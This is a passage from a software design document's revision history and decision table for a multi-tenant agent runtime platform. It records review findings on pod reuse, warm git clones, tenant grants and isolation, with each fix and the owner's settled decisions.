| Major, `openat2` under gVisor | Rejected. | gVisor's current `linux64.go` lists `openat2` as supported on both architectures. Whether it honours both `RESOLVE` flags was not read, so a Tier 6 test stays. |
| Minors: a single live-tree link in F-13.4.24, the §14.1 statement, the lowering row, and the chart's namespace loop | Hold. | Applied. |

A stop check on revision 12 found no Critical or High issue, and T held as an admission figure in every sequence it computed apart from these two. Revision 13 applies one rule for both. No review has read it.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, a lowering frees budget before the pods go | Holds. Fix changed. | The reviewer proposed charging observed warm pods. The creation rule under "Bounds" bounds running pods directly and needs no change to T. |
| Major, reservation churn has no limit | Holds. Fix changed. | The reviewer offered a per-pool cap or a stated residual. The creation rule applies at the tenant's bound, so it costs availability only there, and the residual is stated. |
| Minors: the stale exemption text and stopped pools | Hold. | Applied. Whether a resume or retry treats `429` as a wait is not stated and was not traced. |

Revision 14 adds warm clones, the write scope, and the derive and replay table. A review read it, along with revision 13's creation rule, and found no Critical issue and no path across tenants. The creation rule held. Each finding was checked against the text and the tree, and revision 15 applies them. 

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| High, a resumed session reaches a store no check covered | Holds. | `Binder.Resume` claims by pool alone. Resume, retry, and rebuild now check warm-list URLs the plan omits, and every claim carries the generation it was checked against. |
| Major, restored repositories with no target clone | Holds. Fix wider. | The derive table had no such row. It gains two. A tenant's store now serves default clones alone, so a client's source cannot leave a store-backed repository the plan does not cover. |
| Major, one tenant's warm pods exhaust storage quota | Holds. | `resourceclass.requirements` sets CPU and memory alone. Grants are checked against `warmClones.totalBytes`. |
| Major, the checkout is unsized | Holds. | `podspec/volumes.go` sets no workspace limit. The adapter checks tree size before every checkout, and the disk pressure residual is stated. |
| Major, a template raise breaks the concurrency condition | Holds. Fix changed. | A clone reads as `none` at bind, which keeps the runtime usable, and the event names it. |
| Major, `maxWarmCloneBytes` has no carrier | Holds. | `applyResources` copies to every container. The value is rendered, digested, and added to one container. |
| Major, the write checks contradict "Write scope", and `always` attaches a user's binding | Holds. Fix wider. | The stale sentence goes. The reviewer proposed a wider warning. `always` under `prAuthoring: user` is refused instead, because the agent would gain the user's API power with no client statement. |
| Minors: missing carriers, slot claims, kept trees and pins, `lenny.gitStoreUrl`, allowlist removal, and git and size gaps | Hold. | Applied. Git's offer of alternate ref tips as haves was read from `fetch-pack.c` excerpts and not run. |

A stop check then read revision 15. It found no Critical issue, one High, and six Majors, and no path across tenants. Its statements about Kubernetes and git came from memory. Each was checked against the tree, and most came from warm clones on concurrent pods and from one generation value both refusing and rolling pods, so revision 16 removes those two causes where the review proposed patches.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| High, the generation refusal misses occupied and reserved pods | Holds. Fix changed. | `slotclaimer.go` Pass 1 and both rebinds skip `AdmitTenantPin`. `warm` now needs a one-session pool, so Pass 1 has no free slot, and a reserved pod was checked at create. |
| Major, a stored writable entry survives a template raise | Holds. | An owned pool with a warm or writable clone no longer takes a raise, which also removes the read-as-`none` rule. |
| Major, a derived session resumed before its first checkpoint skips the table | Holds. Exists today. | This is F-7.3.36, already filed. DR-9 now depends on its first suggested route, and the entry names this. |
| Major, new sessions stop on a concurrent pool at budget | Holds. Removed. | Concurrent pools no longer hold stores. |
| Major, a generation move leaves no claimable pod | Holds. Fix changed. | The claim compares `coveredStores` with what the pod holds, so only a removal refuses, and the generation only rolls idle pods. |
| Major, gaps in the derive table | Holds. | The table is keyed on `path`, a kept tree stays kept through a chain of derives, an overlap refuses, and a dropped repository travels as a marker source, which also gives it read tokens under `required`. |
| Major, the size listing fails on a hostile tree | Holds. | The listing streams with a per-entry charge, an entry cap, a time limit, and a total across the plan. |
| Minors: the budget on Helm lowering, carriers, base stores, and the resume error writer | Hold. | Applied. A grant check runs only on a raise, "Stored formats" lists every field, a base with a private store takes no warm entry, and a resume records its reason. |

A stop check then read revision 16. It found no Critical issue, one High, and four Majors, no path across tenants, and no route to the adapter's identity. It read no upstream Kubernetes or git source. Each was checked against the tree, and revision 17 applies them.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| High, a recycled pod skips `coveredStores` | Holds. Introduced by revision 16's fix, which misread `reserved`. | `claimer.go` runs `rebindReserved` before any admission check on a pool where `ReusesPods` is true. `warm` and `write` now need `ReusesPods` false. |
| Major, the hold at concurrency 1 can be evaded | Holds. Fix changed. | `ClaimSlot`'s first pass takes any pod with a live claim. The reviewer proposed computing the value at resolve, which would add a merge to the readers "Template copy" keeps from one, so a recompute under the row's lock replaces it, and `Sandbox.spec.reusesPods` stops the first pass. |
| Major, the age bound fails when access is lost | Holds. | The guard on the warm target goes, so a failing refill does not stop the drain. |
| Major, the derive table reads the wrong plan | Holds. | A source with no checkpoint of its own passes its entries through, and `snapshotIsOwn` also serves F-7.3.36. |
| Major, losing the store can make a restore fail | Holds. | 0111 accepts this as an edge case, and a tenant's edit makes it routine. Restore fetches full history under the fetch cap. |
| Minors: a delegated child's `coveredStores`, drain against roll, and roll order | Hold. Fix wider. | `coveredStores` comes from the plan. The list generation and the rolling replacement go entirely, which removes the second and third, and with no refill on a list change, the change interval goes too. |

A stop check then read revision 17. It found no Critical or High issue, four Majors, no path across tenants, and no route to the adapter's identity. It read no upstream source. Each was checked against the tree, and revision 18 applies them. 

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, widening the policy reopens reuse | Holds. Introduced by revision 17's fix. | `/start` reads `match.Recycle`, `rebindReserved` has no store check, and pass 2 hard-codes `ReusesPods: true`. `reuseLocked` is one-way, which removes the recompute rule and `Sandbox.spec.reusesPods`. |
| Major, full-history restore collides with the workspace limit | Holds. Introduced by revision 17's fix. | §4.4 sets the slot limit, and 0111's rule 6 fails above it. Restore fetches shallow first and fetches history only for a missing object, within the remaining bytes. |
| Major, `coveredStores` from the plan breaks resume | Holds. Introduced by revision 17's fix. | The set now includes the clones a resume checked, and a create with no plan reads the routed runtime. |
| Major, a stuck `warming` Sandbox stalls the drain and the fill limit | Holds. | DR-10 states that `createPod` retries a refused pod. Both limits count pods running a fill, and the drain is not serial. |
| Minors: the one-way `drain` route, backoff reset by a write loop, and a `required` clone under a template raise | Hold. | `pool_drain.go` is the only writer of `DrainingSince`, and nothing clears it, so the sentence naming the route goes. Backoff is keyed by store, and a `required` clone sets `reuseLocked`. |

A review then read revision 19 and `session-replay-design.md` revision 1. It found no Critical issue and no path across tenants. Each finding was checked against the tree, and revision 20 applies them to DR-9. `session-replay-design.md` records those that concern replay alone.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| High, a stop can be bypassed through a derive onto another runtime | Holds. | The tenant-view check reads the final row alone. `planOriginRuntimes` travels with a plan, and a derive checks it. |
| High, a kept default file reaches the adapter's identity | Holds. Introduced by revision 19. | DR-3 leaves an operator's command at the adapter's identity on a pod with no supervisor. A default file on such a pod overwrites, as it does today. |
| Minors: the stale warm rule, the width of the read checks, ancestors of a kept path, and deleted paths | Hold. | Applied. The checks cover warm clones alone, a non-directory ancestor counts as occupied, and `snapshotIsOwn` keeps a deleted path absent. |

A stop check then read revision 20 and `session-replay-design.md` revision 2, and that document records its findings. Revision 21 applies the ones that reach DR-9: a stop that outlives remediation, the refusal of an unsupervised target, and the separate `restoredSnapshotIsOwn`. A further stop check read revision 21, and revision 22 replaces `stoppedAt` with counters and copies the origin set at create. Another read revision 22, and revision 23 moves those counters out of the records they guard and applies the create gates to a derive (F-15.1.78). Revision 24 refuses a `runtimeRef` onto an unsupervised target. Revision 25 applies the next check, which read all of DR-9: a chain through a cancelled derive no longer drops the read check, a delegated child's push stays within its parent's ref patterns, `keepRestored` has two values, and `ref` is validated. Revision 26 refuses a child's exports onto an unsupervised target, and a chain keeps a deleted path absent. That document records the findings. A stop check on revision 26 found no Critical, High, or Major issue and no path across tenants. Revision 27 applies its Minors. The owner then merged derive and replay, so revision 28 replaces the derive text those rounds reviewed, along with `keepRestored`, `restoredDefaults`, `restoredSnapshotIsOwn`, and `session-replay-design.md`, and no review had read it. A review of `session-derive-design.md` then read it, and revision 29 applies the stale text that review found.

## Review of revision 31

An independent review read revision 31 in full. It found no Critical or High issue, two Majors, and no path across tenants. Each was checked against the tree, and revision 32 applies them.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, `true` to `false` is unguarded | Holds. Inherited from the field-by-field rule. | `PUT` takes the same body, `poolPolicyMirror` reads the stored policy, and `ClaimSlot`'s first pass takes any live same-tenant claim. A session on a pod could then gain a neighbour with the union writable set. The field is one-way, an absent field is unchanged, and `reuseLocked` folds into it. |
| Major, a template widening escapes a forbid | Holds. | Suspension fires only on a violating write or a tightening. The copy transaction sets the field on a matching row. The reviewer also offered suspension, which would stop a tenant's runtime for a platform write. `recycle` and `concurrency` now state what they match. |
| Minors: a `true` row's `recycle` block, the copy source of cleanup fields, the scope of a template widening over limits, the `warm` `Warning`, a silently ineffective `false`, and the carriers | Hold. | Applied. A refused `PUT` closes the ineffective `false`. |

## Review of revision 32

A stop check read revision 32's changes. It found no Critical or High issue, three Majors, all in revision 32's forbid rule, and no path across tenants. Each was checked against the tree, and revision 33 applies them.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, the forbid read fails open | Holds. Introduced by revision 32. | `poolstore`'s update carries no tenant, and row security returns no rows and no error. The read runs under `__all__` with its audit event, and `InAllTenants` gains a variant on an open transaction. |
| Major, the lock order inverts | Holds. Introduced by revision 32. | SO-2's writer holds the record and then reaches rows, and its check reads under a shared lock. The copy locks rows and reads with no lock on the record. A tightening applies in its write's transaction, so "activation" goes. |
| Major, suspended rows and "either order" | Holds. Introduced by revision 32. | When the copy commits first, the tightening suspends the row. The field is set only on a transition into a match on an unsuspended row, so `all` and a later unrelated write set nothing. |
| Minors: `ReusesPods` as the `recycle` match, a clone write on a `true` row, and a zero limit | Hold. | Applied. |

## Review of revision 33

A narrow stop check read revision 33's forbid rule. It found no Critical or High issue and two Majors. Each was checked against the design, and revision 34 applies them.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, a tightening can miss a row the copy widens | Holds. Introduced by revision 33. | SO-2 marks non-compliant objects and locks no compliant row, so a copy between its read and its commit leaves a recycling row with no mark. A tightening now locks the tenant's owned rows in name order before evaluating them. |
| Major, clearing a mark can release a row another value matches | Holds. | SO-2 clears the mark a removed rule set. A removal now re-evaluates against the remaining values, which `security-oversight-design.md` revision 24 states. |
| Minor, `suspended_by` has row security | Holds. | The `__all__` read covers it. |

## Review of revision 34

A final check on revision 34's forbid rule found no Critical or High issue and two Majors: a tenant's compliant `PUT` could clear a mark while a template copy read it, and a platform `PUT` on an owned pool had no forbid rule at all. Both held. Three rounds had each found new interleavings, because revisions 32 to 34 made every writer enforce the forbid. Revision 35 stops patching that rule. `recycle` and `concurrency` now apply at resolve, reading `incompatible`, as a grant or base change already does, and a platform `PUT` refuses the pool's concurrency, recycling, and cleanup fields on an owned pool. This removes the cross-tenant read, the lock rules, the marks for these values, and the automatic setting of the field. The cost is that a platform widening stops the runtime of a tenant holding such a forbid until it acts, which revision 32 had rejected.

## Review of revision 35

A narrow check on revision 35 found no Critical or High issue and two Majors. A platform `PUT` could set `executionMode: service` on an owned pool, and a resume skips the tenant view and can be placed on a pod another user held. Both held against `validatePoolUpdate` and `resumeOnPod`. The second showed that a check at resolve has to reach every placement path. Revision 36 removes the need for either rule: `reusedPods` requires `oneSessionPerPod: true`, which no template write can change, so compliance reads one stored field and no writer or placement path interacts with it. A non-compliant row is suspended by SO-2's existing mechanism and its pool drains. The platform `PUT` refuses every field taken from the base or the template. The cost is that a tenant under `reusedPods` sets the field on a runtime whose template happens not to reuse pods today.

## Decisions

These are open for the owner, and the recommendation is the design above. The owner settled decision 4: tenants can define default files, setup commands, and git clones, so its alternative of no tenant defaults is gone, and the owner chose the grant flags in the words "separate flags, off by default". The owner settled decision 17 and decision 20 as recommended, the latter in the words "go with dedicated pools". The owner settled decision 16 as recommended, in the words "go with your recommendation", and settled decisions 22 and 27 on 2026-11-04. The owner settled decisions 1, 3, 6, 7, and 8 as recommended on 2026-11-04, each in the word "ok". The owner settled decisions 9 to 12 as recommended the same day, in the words "go with your recommendations", and decisions 5 and 28, in the words "yes" and "makes sense, yes". The owner settled decision 2 as recommended the same day, after considering an additional grant covering all tenants, in the words "no all-tenant grant. Since grants can be configured via API, it's not a big deal to have grants that are specific to tenants".

| # | Decision | Recommendation | Cost of the recommendation | Alternative |
| :-- | :-- | :-- | :-- | :-- |
| 1 | Where tenant records live | **Settled.** A separate tenant-scoped table with a platform-assigned name prefix | Every session-path read changes, a customer's names carry a prefix, and the prefix appears in operator logs and metric labels | A nullable owner on `runtime_definitions`, which is less code and relies on application filtering, or a composite key, which allows any name and needs a global identifier beside it for pods and CRDs |
| 2 | Who turns it on | **Settled.** A per-tenant platform grant listing bases, templates, and budgets | An operator acts for each tenant and each base | A deployment-wide switch over all granted runtimes, which is less work and gives no per-tenant limit |
| 3 | Raising `maxConcurrentSessions` | **Settled.** Refused. Decision 28 also removes lowering to a middle value. | A tenant wanting higher density asks the operator to raise the template | A ceiling in the grant above the template's value, which moves the acknowledgment to the operator per tenant and adds cost per pod for a tenant wanting it |
| 4 | Tenant defaults | **Settled.** Files, commands, and clones each under their own grant flag, off by default, on a supervised base, after DR-3. Commands also need `allowlist` and `shell: false`. | Where a flag is on, a stolen `tenant-admin` runs code at the agent UID in every new session on that runtime, reading `file` tokens and using `inject` tokens. DR-3 is new work. | No tenant defaults in the first version, which serves R2 and removes this cost, and leaves a tenant needing files or tools to ask an operator. Files without commands is no middle ground, because a file is code. |
| 5 | Pool for each runtime | **Settled.** Always an owned pool, with no fallback | One warm pod at least per runtime, while DF-11 stands | A fallback to a non-recycling, one-session base pool, which costs no warm pods and does not serve decision 15's case |
| 6 | Bounding capacity | **Settled.** `maxOwnedPods` per tenant, checked at write and claim, with the sum of grants at or below a deployment total | The bound is a pod count, the count at claim can overshoot, an operator sizes each grant up front, and the namespace `ResourceQuota` stays shared apart from DR-10's split | A dedicated agent namespace for owned pools, with its own quota. That isolates capacity and needs multi-namespace work in `PoolStoreSource`, `ResolvePool`, and the chart |
| 7 | Template values | **Settled.** Copied, and propagated in the platform write's transaction | A platform write touches every owned row, and a widening reaches tenants at once | Read-through at each use, which needs a new merge in each reader |
| 8 | Base retirement | **Settled.** A notice period of 30 days by default, with an emergency path | A platform waits on retirement, and the figure is a judgment | No notice, which strands tenants, or tenants blocking as today, which R6 refuses |
| 9 | A delay on tenant commands at a tenant with a security record | **Settled.** None on create, with a forbid and an immediate event | A stolen `tenant-admin` at a tenant with no forbid has its command run until someone acts | SO-2's weakening delay on each command change, or an approved-digest list like `tokenTrust.allowedRecords`. Each is additive and slows every legitimate change |
| 10 | Service-mode bases | **Settled.** Refused in the first version | A tenant using a service-mode runtime has no derivation, and an environment needing per-session policy still needs an operator | Allowed with a narrow field set. It gives little, because service mode materializes no workspace, and it depends on a per-pool Service whose creator was not established |
| 11 | Public metadata and cards | **Settled.** Refused, and generated cards carry `tenant` | A tenant's agent is not discoverable across organizations | A grant flag with a content-type allowlist, which publishes customer content on the operator's origin |
| 12 | `tenant-admin` writes on shared records | **Settled.** Removed entirely | §10.2's stated ability goes, including a tenant's scaling of a shared pool | Per-tenant overlays on runtime fields. Derived runtimes meet that need, and `egress-and-git-design.md`'s overlay covers egress and git settings |
| 13 | Experiments on pools | **Settled.** A `tenant-admin` names owned pools alone and reachable runtimes, a `platform-admin` names a platform pool whose single tenant is the experiment's, and the controller applies effects under the same test | Until DR-5 a `tenant-admin`'s variant sets `variant.Runtime` alone, with no warm sizing of its own. A base pool shared with another tenant stays over-warmed during an experiment, and an operator cannot run a variant on a shared pool | Owned pools alone, which ends experiments on a deployment with no grant, or a `platform-admin` approval flag on each experiment, which the controller would have to read |
| 14 | Overlay rows only an owned pool has | **Settled.** Read as `none` unless the grant entry's `ownedOverlays` lists them, with a named variable list, the `internet` lease path stated as a residual, and a posture row and event for an added CA | An operator lists each row per base, a tenant needing its own CA or `gitAccess` asks, and a listed `clientProfile` sets only the named variables, on an `internet` pool | Follow the copied flags as EG-9 states, which opens rows the operator set the flag without considering |
| 15 | An absent `tenantAccess` on a seeded runtime or pool | **Settled.** A `WARN` names a runtime or pool left with no access, and `--force-update` only adds listed tenants. Grants `default` when the seed names no tenant, the seed's tenant when it names exactly one, and none when it names several | A seed naming several tenants lists each grant, or its sessions are refused | Every seeded tenant, which is less to write and over-grants, or none, which breaks §4.2's statement that a single-tenant deployer need not think about tenants |
| 16 | A default clone's write scope | **Settled.** `write: none`, `clientOptIn`, or `always`, default `none`. `clientOptIn` uses a session flag that names no repository. `always` needs `allowGitCloneWrites` and a ref namespace, and a `security-admin` can forbid either value. A user who can read and not write gets a read-only session. `always` is refused under `prAuthoring: user`. | A session can hold push access to a repository its client did not name, and under `always` with no client statement at all | Drop `always`, which leaves transparent clients with no push access |
| 17 | Floating refs on default clones | Allowed, with a `Warning`, a posture entry, and a `floatingCloneRefs` forbid | Whoever can push to the ref runs code in every new session until someone forbids it | Require a full commit, which removes that risk and makes each update a tenant admin's write |
| 18 | Default clones on a `required` pool | **Settled.** Allowed, under the check on the session user's link, refusing a session whose user cannot read | A runtime can be unusable for some users, and a tenant admin chooses which repository a user's access is spent on | Refuse such clones at write, which keeps every read under a `required` pool the user's own statement and loses private default clones there. A skip for users without access changes what the runtime contains per user, so it is not recommended |
| 19 | A default clone's location | **Settled.** Every repository, a client's included, in a named subfolder of `current/`, with `workingDirectory` choosing where the session starts (DR-12) | A tenant cannot place a default repository at the workspace root | Allow `path: .`, which needs the egress design's statement on a non-empty target and makes a client's clone at `.` collide |
| 20 | What a reservation holds | Pods that exist, a split quota, and an optional dedicated node pool, with no preemption or raised priority, in the default agent namespace | Without dedicated nodes a replacement pod can wait. The reserved share stays idle when unused, and a dedicated pool costs idle nodes | Preemption, which guarantees a place and can end other tenants' running sessions. Or low-priority placeholder pods that reserved pods preempt, which holds nodes without a dedicated pool and needs every agent pod to carry `preemptionPolicy: Never`, plus a controller or fixed count sizing the placeholders |
| 21 | Who sets the floor | **Settled.** The operator sets a total, a platform admin sets each tenant's allowance per base and class, and a tenant admin divides it among its runtimes | Three settings to keep in step | A platform admin sets each pool's floor directly, which is simpler and puts an operator's action on every change |
| 22 | A default clone at a derive | **Settled.** A derive has two modes, `from: latest` and `from: start`, and composes nothing, under `session-derive-design.md`. | An earlier agent's changes under a default clone stay under `from: latest`, and a warm clone's commit since removed from the host fails it | Replace the path at the source's commit, which the owner did not want |
| 23 | What a warm clone holds | **Settled.** Objects alone, with the checkout at materialization, as 0111 states | Checkout time stays per session for a large tree | A pre-checked-out tree on each pod, which 0111 lists as a non-goal and which would need a move into each slot and more disk per pod |
| 24 | Sizing a warm store | `maxWarmCloneBytes` in the grant, per pod, added to one container's storage request, with the sum across grants bounded by `warmClones.totalBytes` | The figure is set up front, every pod on the pool requests it whether or not the repository is that large, and the sum is a worst case that overstates use | Unsized, as 0111 has it, which lets a tenant's repository fill a node |
| 25 | Refreshing a warm store | Idle pods drain past an age limit, 24 hours by default, whether or not refills succeed | Churn on idle pods, including a reservation's, refill traffic each day, and a host outage longer than the limit empties the warm pods | No age limit, which leaves an idle pod holding a removed or revoked repository indefinitely, or an in-place fetch, which ends 0111's immutability |
| 26 | A warm fill that keeps failing | The pod stays out of ready, and the pool backs off | A bad clone leaves the runtime with no warm pods until the tenant fixes it | Report ready with no store and fetch cold, which keeps the runtime usable and hides the fault behind slow sessions, as 0111 records |
| 27 | Warm clones on reused pods | **Settled.** Allowed, with the risk accepted. `write` and clones under `required` stay on pods that serve one session. | A repository removed from the runtime stays readable on running pods until they retire | Refuse such pods on the claim paths, which can hit the budget until old pods empty |
| 28 | What a tenant sets on concurrency and recycling | **Settled.** One field, `oneSessionPerPod`, default `false`, which keeps the template's policy. `true` gives one session with no recycling. | A tenant cannot choose a middle value or tune recycling, such as shortening `maxPodUptimeSeconds` on a template that recycles, and asks for another template or sets the field. The field is one-way, so going back takes a new runtime, and it replaces the former `reuseLocked`. | A value lowered field by field, which the owner saw no case for, or no tenant setting, which brings an operator's step back for an environment on a concurrent base |
